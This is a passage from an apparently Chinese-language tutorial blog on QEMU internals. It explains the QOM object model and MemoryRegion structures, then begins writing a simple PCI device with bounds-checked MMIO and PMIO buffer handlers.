将我们自定义的类型 <code>a3_type_info</code> 注册到全局的类型表中</p><h3 id="II、Class-类的静态内容"><a href="#II、Class-类的静态内容" class="headerlink" title="II、Class - 类的静态内容"></a>II、Class - 类的静态内容</h3><p>当我们通过一个 <code>TypeInfo</code> 结构体定义了一个类之后，我们还需要定义一个 Class 结构体来定义这个类的静态内容，包括函数表、静态成员等，其应当继承于对应的 Class 结构体类型，例如我们若是要定义一个新的机器类，则其 Class 应当继承于 <code>MachineClass</code></p><p>所有 Class 结构体类型的最终的父类都是 <code>ObjectClass</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * ObjectClass:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有类的基类.  #ObjectClass 仅包含一个整型类型 handler</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ObjectClass</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Type type;<br>    GSList *interfaces;<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *object_cast_cache[OBJECT_CLASS_CAST_CACHE];<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *class_cast_cache[OBJECT_CLASS_CAST_CACHE];<br><br>    ObjectUnparent *unparent;<br><br>    GHashTable *properties;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个最简单的🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Class</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Class 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Class size 与 Class 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_class_init</span><span class="hljs-params">(ObjectClass *oc, <span class="hljs-type">void</span> *data)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 oc 参数便是新创建的 Class，全局只有一个该实例</span><br>    <span class="hljs-comment">// 我们应当 cast 为我们自己的 Class 类型，之后再进行相应操作</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="III、Object-类的实例对象"><a href="#III、Object-类的实例对象" class="headerlink" title="III、Object - 类的实例对象"></a>III、Object - 类的实例对象</h3><p>我们还需要定义一个相应的 Object 类型来表示一个实例对象，其包含有这个类实际的具体数据，且应当继承于对应的 Object 结构体类型，例如我们若是要定义一个新的机器类型，其实例类型应当继承自 <code>MachineState</code></p><p>所有 Object 结构体类型的最终的父类都是 <code>Object</code> 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Object:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 所有对象的基类。该对象的第一个成员为一个指向 #ObjectClass 的指针。</span><br><span class="hljs-comment"> * 因为 C 中将一个结构体的第一个成员组织在该结构体的 0 字节起始处，</span><br><span class="hljs-comment"> * 只要任何的子类将其父类作为第一个成员，我们都能直接转化为一个 #Object.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 因此, #Object 包含一个对对象类的引用作为其第一个成员。 </span><br><span class="hljs-comment"> * 这允许在运行时识别对象的真实类型</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    ObjectClass *<span class="hljs-class"><span class="hljs-keyword">class</span>;</span><br>    ObjectFree *<span class="hljs-built_in">free</span>;<br>    GHashTable *properties;<br>    <span class="hljs-type">uint32_t</span> ref;<br>    Object *parent;<br>&#125;;<br></code></pre></td></tr></table></figure><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3Object</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    Object parent;<br>&#125;<br></code></pre></td></tr></table></figure><p>完成 Object 的定义之后我们还应当在前面定义的 <code>a3_type_info</code> 中添加上 Object size 与 Object 的构造函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">a3_object_init</span><span class="hljs-params">(Object *obj)</span><br>&#123;<br>    <span class="hljs-comment">// 这里的 obj 参数便是动态创建的类型实例</span><br>    <span class="hljs-comment">// do something</span><br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> TypeInfo a3_type_info = &#123;<br>    .name = <span class="hljs-string">&quot;a3_type&quot;</span>,<br>    .parent = TYPE_OBJECT,<br>    .instance_init = a3_object_init,<br>    .instance_size = <span class="hljs-keyword">sizeof</span>(A3Object),<br>    .class_size = <span class="hljs-keyword">sizeof</span>(A3Class),<br>    .class_init = a3_class_init,<br>    .interfaces = (InterfaceInfo[]) &#123;<br>        &#123; &#125;,<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IV、类的创建与释放"><a href="#IV、类的创建与释放" class="headerlink" title="IV、类的创建与释放"></a>IV、类的创建与释放</h3><p>类似于在 C++ 当中使用 <code>new</code> 与 <code>delete</code> 来创建与释放一个类实例，在 QOM 中我们应当使用 <code>object_new()</code> 与 <code>object_delete()</code> 来创建与销毁一个 QOM 类实例，本质上就是 <code>分配/释放类空间 + 显示调用构造/析构函数</code></p><p>QOM 判断创建类实例的类型是通过类的名字，即 <code>TypeInfo-&gt;name</code>，当创建类实例时 Qemu 会遍历所有的 TypeInfo 并寻找名字匹配的那个，从而调用到对应的构造函数，并将其基类 <code>Object-&gt;class</code> 指向对应的 class</p><p>下面是一个🌰：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// create a QOM object</span><br>A3Object *a3obj = object_new(<span class="hljs-string">&quot;a3_type&quot;</span>);<br><span class="hljs-comment">// delete a QOM object</span><br>object_delete(a3obj);<br></code></pre></td></tr></table></figure><h2 id="二、MemoryRegion-Qemu-中的一块内存区域"><a href="#二、MemoryRegion-Qemu-中的一块内存区域" class="headerlink" title="二、MemoryRegion - Qemu 中的一块内存区域"></a>二、MemoryRegion - Qemu 中的一块内存区域</h2><p>在 Qemu 当中使用 <code>MemoryRegion</code> 结构体类型来表示一块具体的 Guest 物理内存区域，该结构体定义于 <code>include/exec/memory.h</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/** MemoryRegion:</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 表示一块内存区域的一个结构体.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegion</span> &#123;</span><br>    Object parent_obj;<br><br>    <span class="hljs-comment">/* private: */</span><br><br>    <span class="hljs-comment">/* The following fields should fit in a cache line */</span><br>    <span class="hljs-type">bool</span> romd_mode;<br>    <span class="hljs-type">bool</span> ram;<br>    <span class="hljs-type">bool</span> subpage;<br>    <span class="hljs-type">bool</span> readonly; <span class="hljs-comment">/* For RAM regions */</span><br>    <span class="hljs-type">bool</span> nonvolatile;<br>    <span class="hljs-type">bool</span> rom_device;<br>    <span class="hljs-type">bool</span> flush_coalesced_mmio;<br>    <span class="hljs-type">bool</span> global_locking;<br>    <span class="hljs-type">uint8_t</span> dirty_log_mask;<br>    <span class="hljs-type">bool</span> is_iommu;<br>    RAMBlock *ram_block;<br>    Object *owner;<br><br>    <span class="hljs-type">const</span> MemoryRegionOps *ops;<br>    <span class="hljs-type">void</span> *opaque;<br>    MemoryRegion *container;<span class="hljs-comment">// 指向父 MemoryRegion</span><br>    Int128 size;<span class="hljs-comment">// 内存区域大小</span><br>    hwaddr addr;<span class="hljs-comment">// 在父 MR 中的偏移量</span><br>    <span class="hljs-type">void</span> (*destructor)(MemoryRegion *mr);<br>    <span class="hljs-type">uint64_t</span> align;<br>    <span class="hljs-type">bool</span> terminates;<br>    <span class="hljs-type">bool</span> ram_device;<br>    <span class="hljs-type">bool</span> enabled;<br>    <span class="hljs-type">bool</span> warning_printed; <span class="hljs-comment">/* For reservations */</span><br>    <span class="hljs-type">uint8_t</span> vga_logging_count;<br>    MemoryRegion *alias;<span class="hljs-comment">// 仅在 alias MR 中，指向实际的 MR</span><br>    hwaddr alias_offset;<br>    <span class="hljs-type">int32_t</span> priority;<br>    QTAILQ_HEAD(, MemoryRegion) subregions;<br>    QTAILQ_ENTRY(MemoryRegion) subregions_link;<br>    QTAILQ_HEAD(, CoalescedMemoryRange) coalesced;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<br>    <span class="hljs-type">unsigned</span> ioeventfd_nb;<br>    MemoryRegionIoeventfd *ioeventfds;<br>&#125;;<br></code></pre></td></tr></table></figure><p>在 Qemu 当中有三种类型的 MemoryRegion：</p><ul><li>MemoryRegion 根：通过 <code>memory_region_init()</code> 进行初始化，其用以表示与管理由多个 sub-MemoryRegion 组成的一个内存区域，并不实际指向一块内存区域，例如 <code>system_memory</code></li><li>MemoryRegion 实体：通过 <code>memory_region_init_ram()</code> 初始化，表示具体的一块大小为 size 的内存空间，指向一块具体的内存</li><li>MemoryRegion 别名：通过 <code>memory_region_init_alias()</code> 初始化，作为另一个 MemoryRegion 实体的别名而存在，不指向一块实际内存</li></ul><p>MR 容器与 MR 实体间构成树形结构，其中容器为根节点而实体为子节点：</p><blockquote><p>下图来自于<a href="https://richardweiyang-2.gitbook.io/understanding_qemu/00-as/02-memoryregion">这里</a></p></blockquote><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">                       struct MemoryRegion<br>                       +------------------------+                                         <br>                       |<span class="hljs-string">name                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                                         </span><br><span class="hljs-string">                       +------------------------+                                         </span><br><span class="hljs-string">                                  </span>|<br>                                  |<span class="hljs-string"></span><br><span class="hljs-string">          ----+-------------------+---------------------+----</span><br><span class="hljs-string">              </span>|<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br>              |<span class="hljs-string">                                         </span>|<br><br>struct MemoryRegion                            struct MemoryRegion<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">name                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">name                    </span>|<br>|<span class="hljs-string">  (const char *)        </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (const char *)        </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">addr                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">addr                    </span>|<br>|<span class="hljs-string">  (hwaddr)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (hwaddr)              </span>|<br>|<span class="hljs-string">size                    </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">size                    </span>|<br>|<span class="hljs-string">  (Int128)              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">  (Int128)              </span>|<br>+------------------------+                     +------------------------+<br>|<span class="hljs-string">subregions              </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">subregions              </span>|<br>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<span class="hljs-string">                     </span>|<span class="hljs-string">    QTAILQ_HEAD()       </span>|<br>+------------------------+                     +------------------------+<br></code></pre></td></tr></table></figure><p>相应地，基于 OOP 的思想，MemoryRegion 的成员函数被封装在函数表 <code>MemoryRegionOps</code> 当中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Memory region callbacks</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MemoryRegionOps</span> &#123;</span><br>    <span class="hljs-comment">/* 从内存区域上读. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">uint64_t</span> (*read)(<span class="hljs-type">void</span> *opaque,<br>                     hwaddr addr,<br>                     <span class="hljs-type">unsigned</span> size);<br>    <span class="hljs-comment">/* 往内存区域上写. @addr 与 @mr 有关; @size 单位为字节. */</span><br>    <span class="hljs-type">void</span> (*write)(<span class="hljs-type">void</span> *opaque,<br>                  hwaddr addr,<br>                  <span class="hljs-type">uint64_t</span> data,<br>                  <span class="hljs-type">unsigned</span> size);<br><br>    MemTxResult (*read_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                   hwaddr addr,<br>                                   <span class="hljs-type">uint64_t</span> *data,<br>                                   <span class="hljs-type">unsigned</span> size,<br>                                   MemTxAttrs attrs);<br>    MemTxResult (*write_with_attrs)(<span class="hljs-type">void</span> *opaque,<br>                                    hwaddr addr,<br>                                    <span class="hljs-type">uint64_t</span> data,<br>                                    <span class="hljs-type">unsigned</span> size,<br>                                    MemTxAttrs attrs);<br><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">device_endian</span> <span class="hljs-title">endianness</span>;</span><br>    <span class="hljs-comment">/* Guest可见约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则指定了超出机器检查范围的访问大小界限</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* If true, unaligned accesses are supported.  Otherwise unaligned</span><br><span class="hljs-comment">         * accesses throw machine checks.</span><br><span class="hljs-comment">         */</span><br>         <span class="hljs-type">bool</span> unaligned;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">         * 若存在且 #false, 则该事务不会被设备所接受</span><br><span class="hljs-comment">         * (并导致机器的相关行为，例如机器检查异常).</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> (*accepts)(<span class="hljs-type">void</span> *opaque, hwaddr addr,<br>                        <span class="hljs-type">unsigned</span> size, <span class="hljs-type">bool</span> is_write,<br>                        MemTxAttrs attrs);<br>    &#125; valid;<br>    <span class="hljs-comment">/* 内部应用约束: */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>        <span class="hljs-comment">/* 若非 0，则决定了最小的实现的 size .</span><br><span class="hljs-comment">         * 更小的 size 将被向上回绕，且将返回部分结果.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> min_access_size;<br>        <span class="hljs-comment">/* 若非 0，则决定了最大的实现的 size . </span><br><span class="hljs-comment">         * 更大的 size 将被作为一系列的更小的 size 的访问而完成.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">unsigned</span> max_access_size;<br>        <span class="hljs-comment">/* 若为 true, 支持非对齐的访问.  </span><br><span class="hljs-comment">         * 否则所有的访问都将被转换为（可能多种）对齐的访问.</span><br><span class="hljs-comment">         */</span><br>        <span class="hljs-type">bool</span> unaligned;<br>    &#125; impl;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们的 Guest 要读写虚拟机上的内存时，在 Qemu 内部实际上会调用 <code>address_space_rw()</code>，对于一般的 RAM 内存而言则直接对 MR 对应的内存进行操作，对于 MMIO 而言则最终调用到对应的 <code>MR-&gt;ops-&gt;read()</code> 或 <code>MR-&gt;ops-&gt;write()</code></p><p>关于 Qemu 内存管理更多的内容就暂且不在此展开了，不过现在我们知道的是在 Qemu 中使用 <code>MemoryRegion</code> 结构体来表示一段内存区域，<strong>那么我们同样可以通过在设备中添加 MemoryRegion 的方式来为设备添加内存，从而实现与设备间的 MMIO 通信</strong></p><p>同样的，为了统一接口，在 Qemu 当中 <strong>PMIO 的实现同样是通过 MemoryRegion 来完成的</strong></p><h2 id="三、Qemu-中-PCI-设备的编写"><a href="#三、Qemu-中-PCI-设备的编写" class="headerlink" title="三、Qemu 中 PCI 设备的编写"></a>三、Qemu 中 PCI 设备的编写</h2><p>在补充了这么多的 Qemu 相关的知识之后，现在我们可以开始在 Qemu 中编写 PCI 设备了，这里笔者将编写一个最简单的 Qemu 设备，并将源码放在 <code>hw/misc/a3dev.c</code> 中</p><p>Qemu 当中 PCI 设备实例的基类是 <code>PCIDevice</code>，因此我们应当创建一个继承自 <code>PCIDevice</code> 的类来表示我们的设备实例，这里笔者仅声明了两个 <code>MemoryRegion</code> 用作 MMIO 与 PMIO，以及一个用作数据存储的 buffer：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_BUF_SIZE 0x100</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevState</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDevice parent_obj;<br><br>    <span class="hljs-comment">/*&lt; public &gt;*/</span><br>    MemoryRegion mmio;<br>    MemoryRegion pmio;<br>    <span class="hljs-type">uint8_t</span> buf[A3DEV_BUF_SIZE];<br>&#125; A3PCIDevState;<br></code></pre></td></tr></table></figure><p>以及定义一个空的 Class 模板，继承自 PCI 设备的静态类型 <code>PCIDeviceClass</code>，不过这一步并不是必须的，事实上我们可以直接用 <code>PCIDeviceClass</code> 作为我们设备类的 Class：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">A3PCIDevClass</span> &#123;</span><br>    <span class="hljs-comment">/*&lt; private &gt;*/</span><br>    PCIDeviceClass parent;<br>&#125; A3PCIDevClass;<br></code></pre></td></tr></table></figure><p>以及两个将父类转为子类的宏，因为 QOM 基本函数传递的大都是父类指针，所以我们需要一个宏来进行类型检查 + 转型，这也是 Qemu 中惯用的做法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPE_A3DEV_PCI <span class="hljs-string">&quot;a3dev-pci&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI(obj) \</span><br><span class="hljs-meta">    OBJECT_CHECK(A3PCIDevState, (obj), TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_GET_CLASS(obj) \</span><br><span class="hljs-meta">    OBJECT_GET_CLASS(A3PCIDevClass, obj, TYPE_A3DEV_PCI)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A3DEV_PCI_CLASS(klass) \</span><br><span class="hljs-meta">    OBJECT_CLASS_CHECK(A3PCIDevClass, klass, TYPE_A3DEV_PCI)</span><br></code></pre></td></tr></table></figure><p>下面我们开始定义 MMIO 与 PMIO 的操作函数，这里笔者就简单地设置为读写设备内部的 buffer，并声明上两个 MemoryRegion 对应的函数表，需要注意的是这里传入的 <code>hwaddr</code> 类型参数其实为相对地址而非绝对地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br>    <span class="hljs-type">uint64_t</span> val = ~<span class="hljs-number">0LL</span>;<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> val;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> val;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;val, &amp;ds-&gt;buf[addr], size);<br>    <span class="hljs-keyword">return</span> val;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">a3dev_write</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">uint64_t</span> val, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    A3PCIDevState *ds = A3DEV_PCI(opaque);<br><br>    <span class="hljs-keyword">if</span> (size &gt; <span class="hljs-number">8</span>)<br>        <span class="hljs-keyword">return</span> ;<br><br>    <span class="hljs-keyword">if</span> (addr + size &gt; A3DEV_BUF_SIZE)<br>        <span class="hljs-keyword">return</span> ;<br>    <br>    <span class="hljs-built_in">memcpy</span>(&amp;ds-&gt;buf[addr], &amp;val, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_mmio_read</span><span class="hljs-params">(<span class="hljs-type">void</span> *opaque, hwaddr addr, <span class="hljs-type">unsigned</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a3dev_read(opaque, addr, size);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">uint64_t</span><br><span class="hljs-title function_">a3dev_pmio_read</span><span 